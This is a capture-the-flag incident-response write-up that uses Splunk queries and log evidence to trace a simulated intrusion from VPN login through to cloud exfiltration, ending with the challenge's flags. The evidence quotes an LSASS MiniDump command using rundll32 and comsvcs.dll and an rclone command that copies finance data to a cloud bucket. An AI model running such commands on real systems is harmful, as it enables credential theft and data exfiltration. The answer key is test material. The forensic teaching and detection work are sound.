# Green Ledger DFIR Write-up — Thryve CTF

**Case ID:** `GL-20260809`
**Index:** `green_ledger`
**Primary Platform:** Splunk
**Category:** DFIR / Incident Response
**Final Status:** Solved

---

## 1. Executive Summary

The `Green Ledger` case traces a full intrusion chain beginning with suspicious VPN access, followed by internal reconnaissance, payload execution on a workstation, LSASS credential dumping, lateral movement to a file server, and exfiltration to Google Cloud Storage.

The attacker first authenticated to the corporate VPN as `nova0x` using `openfortivpn` from infrastructure geolocated to the Netherlands. After receiving tunnel IP `10.250.19.44`, the actor interacted with internal systems, including RDP, SMB, WinRM, and an internal finance portal.

The workstation `AMM-LT-017` then downloaded a PowerShell payload from `cdn.sysupdate-check.com`. Credential dumping followed shortly after via `rundll32.exe` and `comsvcs.dll`, producing an LSASS dump file at:

```text id="j3y3gt"
C:\ProgramData\Microsoft\Vault\lsass_716.dmp
```

The stolen or abused account `svc_backup` was later used to access the file server `AMM-FS-01` from `10.31.18.47`. Data from `D:\Finance\Quarterly` was then exfiltrated using `rclone.exe` to `storage.googleapis.com`, with `681574400` outbound bytes recorded by the proxy and EDR.

### High-Level Attack Chain

```text id="v8gqjz"
VPN access as nova0x
        ↓
Internal recon over RDP / SMB / WinRM
        ↓
Payload download from cdn.sysupdate-check.com
        ↓
Encoded PowerShell execution on AMM-LT-017
        ↓
LSASS dump using rundll32.exe + comsvcs.dll
        ↓
svc_backup lateral movement to AMM-FS-01
        ↓
rclone.exe exfiltration to storage.googleapis.com
```

---

## 2. Data Sources Used

The investigation correlated multiple telemetry sources:

| Source                                                | Purpose                                                                         |
| ----------------------------------------------------- | ------------------------------------------------------------------------------- |
| `fortigate:vpn`                                       | VPN authentication, MFA status, tunnel IP, session ID                           |
| `linux_secure`                                        | VPN client execution and assigned tunnel route on `kali-edge`                   |
| `zeek:conn`                                           | Internal network connections after VPN access                                   |
| `stream:dns`                                          | DNS resolution for payload and exfiltration domains                             |
| `bluecoat:proxysg:access:syslog`                      | HTTP/HTTPS proxy traffic, upload/download size, URL, destination IP             |
| `edr:telemetry`                                       | High-level detection alerts for execution, credential dumping, and exfiltration |
| `XmlWinEventLog:Microsoft-Windows-Sysmon/Operational` | Process creation, process access, and file creation evidence                    |
| `WinEventLog:Security`                                | Windows logon events for lateral movement                                       |

Base query used throughout:

```spl id="nqz9gt"
index=green_ledger case_id="GL-20260809"
```

When searching across Windows logs or mixed telemetry, the broader form was used:

```spl id="7dy6q7"
index=* case_id="GL-20260809"
```

---

## 3. Investigation Notes and Query Pitfall

Several Windows events stored fields such as `EventCode`, `AccountName`, `LogonType`, `IpAddress`, and `WorkstationName` inside JSON in `_raw`.

Because of that, this style of query can return no results:

```spl id="1ygl2w"
index=* case_id="GL-20260809" host="AMM-FS-01" EventCode=4624
| spath
```

The field `EventCode` is not reliably available until after `spath` parses the JSON.

The correct approach is:

```spl id="0phx3u"
index=* earliest="08/09/2026:07:00:00" latest="08/09/2026:10:00:00"
| spath
| search case_id="GL-20260809" sourcetype="WinEventLog:Security" EventCode=4624
| table _time host AccountName IpAddress WorkstationName LogonType AuthenticationPackageName LogonProcessName _raw
| sort _time
```

This parsing issue was important during the lateral movement investigation.

---

## 4. Challenge Answers

| Question              | Final Flag                                                                                   |
| --------------------- | -------------------------------------------------------------------------------------------- |
| Suspicious VPN access | `Thryve{nova0x_10.250.19.44_vpn-7f4c2a91}`                                                   |
| Payload execution     | `Thryve{AMM-LT-017_nova0x_18f8b6cc3e2c4f2b7f4d3b7a50d0155ed3b19e33c0fbf09869a1d2f4f91bb24d}` |
| Credential dumping    | `Thryve{AMM-LT-017_rundll32.exe_lsass.exe_lsass_716.dmp_0x1010}`                             |
| Lateral movement      | `Thryve{svc_backup_AMM-FS-01_10.31.18.47_LogonType10}`                                       |
| Exfiltration          | `Thryve{svc_backup_rclone.exe_storage.googleapis.com_681574400}`                             |

---

# 5. Walkthrough

## 5.1 Suspicious VPN Access

### Goal

Identify the suspicious VPN login and submit the relevant user, assigned tunnel IP, and VPN session ID.

### Query

```spl id="p5n8tg"
index=green_ledger case_id="GL-20260809" sourcetype="fortigate:vpn"
| table _time user src_ip geo user_agent action status reason session_id tunnel_ip _raw
| sort _time
```

A broader aggregation was also useful to compare users, source IPs, and successful sessions:

```spl id="ytf40k"
index=green_ledger case_id="GL-20260809" sourcetype="fortigate:vpn"
| eval success=if(action="tunnel-up" OR status="success",1,0)
| eval fail=if(action="failed-login" OR status="failure",1,0)
| stats count as total
        sum(fail) as failed
        sum(success) as success
        values(reason) as reasons
        values(geo) as geos
        values(user_agent) as agents
        values(tunnel_ip) as tunnel_ips
        values(session_id) as sessions
        min(_time) as first
        max(_time) as last
        by user src_ip
| convert ctime(first) ctime(last)
| sort -success -failed
```

### Evidence

The suspicious login pattern was tied to `nova0x` from `94.249.7.25` using `openfortivpn/1.21.0`.

Several failed VPN attempts were followed by a successful `tunnel-up` event:

```json id="1e7czn"
{
  "case_id": "GL-20260809",
  "event": "ssl_vpn_auth",
  "action": "tunnel-up",
  "status": "success",
  "user": "nova0x",
  "src_ip": "94.249.7.25",
  "geo": "NL",
  "user_agent": "openfortivpn/1.21.0 (kali)",
  "mfa": "push_approved",
  "session_id": "vpn-7f4c2a91",
  "tunnel_ip": "10.250.19.44"
}
```

The `kali-edge` host also recorded the VPN client connection:

```json id="kq6s1k"
{
  "case_id": "GL-20260809",
  "process": "openfortivpn",
  "user": "root",
  "src_ip": "94.249.7.25",
  "message": "openfortivpn connected; assigned address 10.250.19.44; route 10.31.0.0/16",
  "pid": 1442
}
```

### Reasoning

The combination of:

* repeated failed logins,
* successful MFA push approval,
* `openfortivpn` user-agent,
* external source IP `94.249.7.25`,
* assigned tunnel IP `10.250.19.44`, and
* session ID `vpn-7f4c2a91`

identified the suspicious access.

### Flag

```text id="2j6e7h"
Thryve{nova0x_10.250.19.44_vpn-7f4c2a91}
```

---

## 5.2 Internal Reconnaissance After VPN Access

### Goal

Reconstruct what the actor did after receiving VPN access.

This was not one of the final flag questions, but it helped build the timeline and identify the compromised systems.

### Query

```spl id="cz5lfr"
index=green_ledger case_id="GL-20260809" "10.250.19.44"
| table _time host sourcetype user src_ip dest_ip DestinationPort id_orig_h id_resp_h id_resp_p service url bytes_out bytes_in _raw
| sort _time
```

### Evidence

Shortly after the VPN connection, Zeek recorded internal connections originating from the assigned tunnel IP.

#### RDP

```json id="cf6ndw"
{
  "case_id": "GL-20260809",
  "uid": "f9607c5e-d7f",
  "id_orig_h": "10.250.19.44",
  "id_resp_h": "10.31.20.12",
  "id_resp_p": 3389,
  "proto": "tcp",
  "service": "rdp",
  "conn_state": "S1",
  "history": "ShADad",
  "orig_bytes": 555,
  "resp_bytes": 814
}
```

#### SMB

```json id="j9k2op"
{
  "case_id": "GL-20260809",
  "uid": "700d35de-8b6",
  "id_orig_h": "10.250.19.44",
  "id_resp_h": "10.31.18.47",
  "id_resp_p": 445,
  "proto": "tcp",
  "service": "smb",
  "conn_state": "S1",
  "history": "ShADad",
  "orig_bytes": 389,
  "resp_bytes": 832
}
```

#### WinRM

```json id="a7i2pq"
{
  "case_id": "GL-20260809",
  "uid": "55b11a1f-abf",
  "id_orig_h": "10.250.19.44",
  "id_resp_h": "10.31.18.10",
  "id_resp_p": 5985,
  "proto": "tcp",
  "service": "winrm",
  "conn_state": "S1",
  "history": "ShADad",
  "orig_bytes": 449,
  "resp_bytes": 1071
}
```

The actor also accessed an internal finance page:

```json id="j3k0ww"
{
  "case_id": "GL-20260809",
  "src_ip": "10.250.19.44",
  "user": "nova0x",
  "cs_method": "GET",
  "status": 200,
  "url": "https://intranet.thryve.local/finance/summary",
  "dest_ip": "10.31.18.20",
  "bytes_out": 7420,
  "bytes_in": 57312,
  "category": "Internal"
}
```

### Reasoning

The internal reconnaissance sequence showed interaction with:

| Destination   |   Port | Service                 | Interpretation                       |
| ------------- | -----: | ----------------------- | ------------------------------------ |
| `10.31.20.12` | `3389` | RDP                     | likely file server access path       |
| `10.31.18.47` |  `445` | SMB                     | workstation / file share interaction |
| `10.31.18.10` | `5985` | WinRM                   | remote management probing            |
| `10.31.18.20` |  HTTPS | internal finance portal | business data discovery              |

This positioned `10.31.18.47` and `10.31.20.12` as important later pivots.

---

## 5.3 Payload Execution on `AMM-LT-017`

### Goal

Identify the endpoint affected by payload execution, the user, and the payload hash.

### Query

```spl id="ndy1c8"
index=green_ledger case_id="GL-20260809"
("cdn.sysupdate-check.com" OR "svc.ps1" OR "Encoded PowerShell with external download")
| table _time host sourcetype user src_ip query cs_method url dest_ip bytes_out bytes_in detection file_hash_sha256 _raw
| sort _time
```

### Evidence

DNS resolution for the payload domain:

```json id="a9i4g3"
{
  "case_id": "GL-20260809",
  "src_ip": "10.31.18.47",
  "user": "nova0x",
  "query": "cdn.sysupdate-check.com",
  "answer": "45.148.10.91",
  "record_type": "A",
  "action": "allowed"
}
```

Proxy download event:

```json id="6t3c9w"
{
  "case_id": "GL-20260809",
  "src_ip": "10.31.18.47",
  "user": "nova0x",
  "cs_method": "GET",
  "status": 200,
  "url": "https://cdn.sysupdate-check.com/aster/svc.ps1",
  "dest_ip": "45.148.10.91",
  "bytes_out": 1289,
  "bytes_in": 44192,
  "category": "Uncategorized"
}
```

EDR detection:

```json id="2xg8qs"
{
  "case_id": "GL-20260809",
  "severity": "medium",
  "user": "nova0x",
  "tactic": "Execution",
  "technique": "T1059.001",
  "verdict": "monitor",
  "detection": "Encoded PowerShell with external download",
  "file_hash_sha256": "18f8b6cc3e2c4f2b7f4d3b7a50d0155ed3b19e33c0fbf09869a1d2f4f91bb24d"
}
```

### Reasoning

The domain `cdn.sysupdate-check.com` appeared to be a fake update/CDN domain.

The sequence of:

1. DNS resolution,
2. HTTP GET for `svc.ps1`, and
3. EDR alert for encoded PowerShell

established the payload execution on `AMM-LT-017` by `nova0x`.

### Flag

```text id="ys3a9j"
Thryve{AMM-LT-017_nova0x_18f8b6cc3e2c4f2b7f4d3b7a50d0155ed3b19e33c0fbf09869a1d2f4f91bb24d}
```

---

## 5.4 Credential Dumping — LSASS MiniDump

### Goal

Find the credential dumping activity and submit:

```text id="8v5g9m"
Thryve{hostname_process_target_dumpfile_accessmask}
```

### Query

```spl id="3r5n0f"
index=* case_id="GL-20260809" host="AMM-LT-017" earliest="08/09/2026:07:58:00" latest="08/09/2026:07:58:20"
(EventCode=10 OR EventCode=1 OR EventCode=11 OR "MiniDump" OR "lsass_716.dmp")
| spath
| eval process=coalesce(Image,SourceImage)
| rex field=process "[\\\\/](?<process_name>[^\\\\/]+)$"
| rex field=TargetImage "[\\\\/](?<target_process>[^\\\\/]+)$"
| rex field=TargetFilename "[\\\\/](?<dumpfile>[^\\\\/]+)$"
| table _time EventCode host User process_name target_process dumpfile GrantedAccess CommandLine SourceImage TargetImage TargetFilename _raw
| sort _time
```

### Evidence

#### Sysmon Process Access

```json id="3a6y8n"
{
  "case_id": "GL-20260809",
  "EventCode": 10,
  "User": "THRYVE\\nova0x",
  "SourceImage": "C:\\Windows\\System32\\rundll32.exe",
  "TargetImage": "C:\\Windows\\System32\\lsass.exe",
  "GrantedAccess": "0x1010",
  "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+9d4b4|C:\\Windows\\System32\\comsvcs.dll+1f2a",
  "SourceProcessGUID": "{a9f84eb9-7206-02c6-5cac-cc6b6eb031b6}"
}
```

#### Sysmon Process Creation

```json id="j4x5r0"
{
  "case_id": "GL-20260809",
  "EventCode": 1,
  "User": "THRYVE\\nova0x",
  "Image": "C:\\Windows\\System32\\rundll32.exe",
  "ParentImage": "C:\\Windows\\System32\\cmd.exe",
  "CommandLine": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 716 C:\\ProgramData\\Microsoft\\Vault\\lsass_716.dmp full"
}
```

#### Sysmon File Creation

```json id="h6k8pr"
{
  "case_id": "GL-20260809",
  "EventCode": 11,
  "User": "THRYVE\\nova0x",
  "Image": "C:\\Windows\\System32\\rundll32.exe",
  "TargetFilename": "C:\\ProgramData\\Microsoft\\Vault\\lsass_716.dmp"
}
```

EDR detection:

```json id="s7p1wl"
{
  "case_id": "GL-20260809",
  "severity": "high",
  "user": "nova0x",
  "tactic": "Credential Access",
  "technique": "T1003.001",
  "verdict": "alert",
  "detection": "Suspicious LSASS memory access and dump file creation"
}
```

### Reasoning

The credential dumping technique used a known Windows LOLBin pattern:

```text id="7v1m4q"
rundll32.exe comsvcs.dll, MiniDump <PID> <output_path> full
```

The important fields were:

| Required Field | Value           |
| -------------- | --------------- |
| Hostname       | `AMM-LT-017`    |
| Process        | `rundll32.exe`  |
| Target Process | `lsass.exe`     |
| Dump File      | `lsass_716.dmp` |
| Access Mask    | `0x1010`        |

The access mask had to come directly from Sysmon `GrantedAccess`. Guessing common LSASS access masks was not reliable.

### Flag

```text id="m5z0ka"
Thryve{AMM-LT-017_rundll32.exe_lsass.exe_lsass_716.dmp_0x1010}
```

---

## 5.5 Lateral Movement to File Server

### Goal

Identify lateral movement onto the file server and submit:

```text id="7k3d8v"
Thryve{account_host_source-ip_LogonTypeXX}
```

### Failed Initial Approach

The first query returned no results because `EventCode=4624` was applied before JSON parsing:

```spl id="d6p2kn"
index=* case_id="GL-20260809" host="AMM-FS-01" EventCode=4624
| spath
```

### Correct Query

```spl id="m1c9y2"
index=* earliest="08/09/2026:07:00:00" latest="08/09/2026:10:00:00"
| spath
| search case_id="GL-20260809" sourcetype="WinEventLog:Security" EventCode=4624
| where isnotnull(IpAddress) AND IpAddress!="-" AND AccountName!="*$"
| table _time host AccountName IpAddress WorkstationName LogonType AuthenticationPackageName LogonProcessName _raw
| sort _time
```

A broader version also helped review failed and special logon events:

```spl id="d0j1hk"
index=* earliest="08/09/2026:07:00:00" latest="08/09/2026:10:00:00"
| spath
| search case_id="GL-20260809" sourcetype="WinEventLog:Security"
| search EventCode=4624 OR EventCode=4625 OR EventCode=4648 OR EventCode=4672
| table _time host EventCode AccountName IpAddress WorkstationName LogonType AuthenticationPackageName LogonProcessName _raw
| sort _time
```

### Evidence

Relevant successful logon:

```json id="l6z8m2"
{
  "case_id": "GL-20260809",
  "EventCode": 4624,
  "AccountName": "svc_backup",
  "LogonType": 10,
  "IpAddress": "10.31.18.47",
  "WorkstationName": "AMM-LT-017",
  "AuthenticationPackageName": "Negotiate",
  "SubjectLogonId": "0x8a731"
}
```

Event table values:

| Field            | Value                 |
| ---------------- | --------------------- |
| Time             | `2026-08-09 08:33:29` |
| Destination host | `AMM-FS-01`           |
| Account          | `svc_backup`          |
| Source IP        | `10.31.18.47`         |
| Workstation      | `AMM-LT-017`          |
| Logon Type       | `10`                  |

### Reasoning

The suspicious account changed from `nova0x` to `svc_backup` after credential access.

The successful logon to `AMM-FS-01` from `AMM-LT-017` established lateral movement onto the file server.

`LogonType 10` is consistent with remote interactive access.

### Flag

```text id="m1g6s3"
Thryve{svc_backup_AMM-FS-01_10.31.18.47_LogonType10}
```

---

## 5.6 Exfiltration Event

### Goal

Find the exfiltration event and submit:

```text id="4p8x2z"
Thryve{account_tool_destination_bytes}
```

### Query

```spl id="v4c8n6"
index=* case_id="GL-20260809" earliest="08/09/2026:09:10:00" latest="08/09/2026:09:18:00"
("rclone" OR "thryve-archive" OR "storage.googleapis.com" OR "681574400" OR "High volume upload")
| spath
| table _time host sourcetype source EventCode User user AccountName process process_name Image ParentImage CommandLine OriginalFileName Product Description user_agent UserAgent cs_user_agent http_user_agent cs_method url query category bytes_out bytes_in _raw
| sort _time
```

### Evidence 1 — Tool Execution

Sysmon process creation showed `rclone.exe` launched by `svc_backup`:

```json id="f9c2r1"
{
  "case_id": "GL-20260809",
  "EventCode": 1,
  "User": "THRYVE\\svc_backup",
  "Image": "C:\\ProgramData\\Backup\\rclone.exe",
  "ParentImage": "C:\\Windows\\System32\\cmd.exe",
  "CommandLine": "rclone.exe copy D:\\Finance\\Quarterly gcs:thryve-archive --transfers 8 --checkers 12 --log-file C:\\ProgramData\\Backup\\sync.log"
}
```

Important fields:

| Field            | Value                            |
| ---------------- | -------------------------------- |
| Account          | `svc_backup`                     |
| Tool             | `rclone.exe`                     |
| Source directory | `D:\Finance\Quarterly`           |
| rclone remote    | `gcs:thryve-archive`             |
| Log file         | `C:\ProgramData\Backup\sync.log` |

### Evidence 2 — DNS Resolution

```json id="s3y8k0"
{
  "case_id": "GL-20260809",
  "src_ip": "10.31.20.12",
  "user": "svc_backup",
  "query": "storage.googleapis.com",
  "answer": "142.250.186.27",
  "record_type": "A",
  "action": "allowed"
}
```

### Evidence 3 — Proxy Upload

```json id="w2q6j9"
{
  "case_id": "GL-20260809",
  "src_ip": "10.31.20.12",
  "user": "svc_backup",
  "cs_method": "POST",
  "status": 200,
  "url": "https://storage.googleapis.com/upload/storage/v1/b/thryve-archive/o",
  "dest_ip": "142.250.186.27",
  "bytes_out": 681574400,
  "bytes_in": 9240,
  "category": "Cloud Storage"
}
```

### Evidence 4 — EDR Exfiltration Alert

```json id="p5w7r2"
{
  "case_id": "GL-20260809",
  "severity": "high",
  "user": "svc_backup",
  "tactic": "Exfiltration",
  "technique": "T1567.002",
  "verdict": "alert",
  "detection": "High volume upload to cloud storage by backup account",
  "bytes_out": 681574400
}
```

### Debugging the Flag Format

Several technically reasonable variants failed during solving:

```text id="n4c8x1"
Thryve{svc_backup_POST_storage.googleapis.com_681574400}
Thryve{svc_backup_rclone_storage.googleapis.com_681574400}
Thryve{svc_backup_rclone_gcs_681574400}
Thryve{svc_backup_rclone_thryve-archive_681574400}
Thryve{svc_backup_rclone_Cloud_Storage_681574400}
```

The accepted answer required:

* account from the proxy/EDR user field: `svc_backup`
* tool exactly from the executable name: `rclone.exe`
* destination service as the service domain: `storage.googleapis.com`
* outbound byte count: `681574400`

### Flag

```text id="n7w2c9"
Thryve{svc_backup_rclone.exe_storage.googleapis.com_681574400}
```

---

# 6. Incident Timeline

| Time                | Host         | Event                       | Key Evidence                                              |
| ------------------- | ------------ | --------------------------- | --------------------------------------------------------- |
| `07:03:00–07:05:40` | `AMM-VPN-01` | Failed VPN attempts         | `nova0x`, `94.249.7.25`, `openfortivpn/1.21.0`            |
| `07:07:42`          | `AMM-VPN-01` | VPN success                 | `nova0x`, `vpn-7f4c2a91`, tunnel `10.250.19.44`           |
| `07:08:05`          | `kali-edge`  | VPN route created           | `openfortivpn connected`, route `10.31.0.0/16`            |
| `07:09:03`          | `sensor-01`  | RDP connection              | `10.250.19.44 → 10.31.20.12:3389`                         |
| `07:09:05`          | `sensor-01`  | SMB connection              | `10.250.19.44 → 10.31.18.47:445`                          |
| `07:09:38`          | `sensor-01`  | WinRM connection            | `10.250.19.44 → 10.31.18.10:5985`                         |
| `07:10:04`          | `AMM-PRX-01` | Internal finance access     | `/finance/summary`, user `nova0x`                         |
| `07:29:16`          | `AMM-DC-01`  | Payload DNS                 | `cdn.sysupdate-check.com → 45.148.10.91`                  |
| `07:29:22`          | `AMM-PRX-01` | Payload download            | `GET /aster/svc.ps1`                                      |
| `07:36:03`          | `AMM-LT-017` | EDR execution detection     | Encoded PowerShell, SHA256 payload hash                   |
| `07:58:03`          | `AMM-LT-017` | LSASS access                | `rundll32.exe → lsass.exe`, `GrantedAccess=0x1010`        |
| `07:58:08`          | `AMM-LT-017` | MiniDump command            | `comsvcs.dll, MiniDump 716 ... lsass_716.dmp full`        |
| `07:58:18`          | `AMM-LT-017` | Dump file creation          | `C:\ProgramData\Microsoft\Vault\lsass_716.dmp`            |
| `07:59:05`          | `AMM-LT-017` | EDR credential access alert | `T1003.001`                                               |
| `08:33:29`          | `AMM-FS-01`  | Lateral movement            | `svc_backup`, source `10.31.18.47`, LogonType `10`        |
| `09:14:44`          | `AMM-FS-01`  | Exfil tool execution        | `rclone.exe copy D:\Finance\Quarterly gcs:thryve-archive` |
| `09:14:50`          | `AMM-DC-01`  | Exfil DNS                   | `storage.googleapis.com → 142.250.186.27`                 |
| `09:14:55`          | `AMM-PRX-01` | Data upload                 | `POST storage.googleapis.com`, `681574400` bytes out      |
| `09:16:10`          | `AMM-FS-01`  | EDR exfil alert             | `T1567.002`, high-volume cloud upload                     |

---

# 7. Indicators of Compromise

## Accounts

| Account      | Role in Incident                                     |
| ------------ | ---------------------------------------------------- |
| `nova0x`     | Initial VPN access, payload execution, LSASS dumping |
| `svc_backup` | Lateral movement to file server, data exfiltration   |

## Hosts

| Host         | Role                                                             |
| ------------ | ---------------------------------------------------------------- |
| `AMM-VPN-01` | VPN authentication source                                        |
| `kali-edge`  | VPN client execution host                                        |
| `AMM-LT-017` | Compromised workstation / payload execution / credential dumping |
| `AMM-FS-01`  | File server accessed with `svc_backup`; exfiltration source      |
| `AMM-PRX-01` | Proxy log source for payload download and exfil upload           |
| `AMM-DC-01`  | DNS resolver / Windows Security events                           |
| `sensor-01`  | Zeek internal network connection telemetry                       |

## Network Indicators

| Indicator        | Context                                          |
| ---------------- | ------------------------------------------------ |
| `94.249.7.25`    | VPN source IP used by `nova0x`                   |
| `10.250.19.44`   | VPN tunnel IP assigned to attacker session       |
| `10.31.18.47`    | Workstation IP associated with `AMM-LT-017`      |
| `10.31.20.12`    | File server IP associated with `AMM-FS-01`       |
| `45.148.10.91`   | Payload hosting IP for `cdn.sysupdate-check.com` |
| `142.250.186.27` | Resolved IP for `storage.googleapis.com`         |

## Domains and URLs

| Indicator                                                             | Context                                     |
| --------------------------------------------------------------------- | ------------------------------------------- |
| `cdn.sysupdate-check.com`                                             | Payload staging domain                      |
| `https://cdn.sysupdate-check.com/aster/svc.ps1`                       | Downloaded PowerShell payload               |
| `storage.googleapis.com`                                              | Exfiltration destination service            |
| `https://storage.googleapis.com/upload/storage/v1/b/thryve-archive/o` | Google Cloud Storage upload URL             |
| `thryve-archive`                                                      | Cloud storage bucket / rclone remote target |

## Files and Processes

| Indicator                                      | Context                                |
| ---------------------------------------------- | -------------------------------------- |
| `rundll32.exe`                                 | Used with `comsvcs.dll` to dump LSASS  |
| `comsvcs.dll`                                  | DLL abused for MiniDump                |
| `lsass.exe`                                    | Credential dumping target              |
| `C:\ProgramData\Microsoft\Vault\lsass_716.dmp` | LSASS dump output path                 |
| `rclone.exe`                                   | Exfiltration tool                      |
| `C:\ProgramData\Backup\rclone.exe`             | Full rclone executable path            |
| `C:\ProgramData\Backup\sync.log`               | rclone log file path                   |
| `D:\Finance\Quarterly`                         | Source data directory for exfiltration |

## Hashes

| SHA256                                                             | Context                                                      |
| ------------------------------------------------------------------ | ------------------------------------------------------------ |
| `18f8b6cc3e2c4f2b7f4d3b7a50d0155ed3b19e33c0fbf09869a1d2f4f91bb24d` | Payload associated with encoded PowerShell external download |

---

# 8. Detection and Response Notes

## Recommended Hunts

### Hunt for Suspicious VPN Sessions

```spl id="e8k3r2"
index=green_ledger sourcetype="fortigate:vpn"
| stats count as total
        values(action) as actions
        values(status) as statuses
        values(reason) as reasons
        values(user_agent) as user_agents
        values(tunnel_ip) as tunnel_ips
        values(session_id) as sessions
        min(_time) as first
        max(_time) as last
        by user src_ip geo
| convert ctime(first) ctime(last)
| where mvcount(user_agents)>0
| sort -total
```

### Hunt for Encoded PowerShell Download Behavior

```spl id="y9p4w6"
index=* ("EncodedCommand" OR "-enc" OR "powershell" OR "external download" OR "svc.ps1")
| table _time host sourcetype user User Image ParentImage CommandLine url query file_hash_sha256 detection _raw
| sort _time
```

### Hunt for LSASS MiniDump via `comsvcs.dll`

```spl id="b6x2n8"
index=* ("comsvcs.dll" OR "MiniDump" OR "lsass" OR "lsass_*.dmp")
| spath
| table _time host sourcetype EventCode User Image ParentImage CommandLine SourceImage TargetImage GrantedAccess TargetFilename detection _raw
| sort _time
```

### Hunt for rclone-Based Exfiltration

```spl id="q7m3k5"
index=* ("rclone" OR "gcs:" OR "storage.googleapis.com" OR "--transfers" OR "--checkers")
| spath
| table _time host sourcetype EventCode User user Image ParentImage CommandLine cs_method url category bytes_out _raw
| sort _time
```

### Hunt for High-Volume Uploads to Cloud Storage

```spl id="u4c9s1"
index=green_ledger sourcetype="bluecoat:proxysg:access:syslog"
| spath
| where bytes_out > 100000000
| table _time user src_ip dest_ip cs_method url category bytes_out bytes_in _raw
| sort -bytes_out
```

---

# 9. Final Flags

### Suspicious VPN Access

```text id="x2f7c9"
Thryve{nova0x_10.250.19.44_vpn-7f4c2a91}
```

### Payload Execution

```text id="c5k8m2"
Thryve{AMM-LT-017_nova0x_18f8b6cc3e2c4f2b7f4d3b7a50d0155ed3b19e33c0fbf09869a1d2f4f91bb24d}
```

### Credential Dumping

```text id="r6n1w4"
Thryve{AMM-LT-017_rundll32.exe_lsass.exe_lsass_716.dmp_0x1010}
```

### Lateral Movement

```text id="k3v9p7"
Thryve{svc_backup_AMM-FS-01_10.31.18.47_LogonType10}
```

### Exfiltration

```text id="m8q2x5"
Thryve{svc_backup_rclone.exe_storage.googleapis.com_681574400}
```
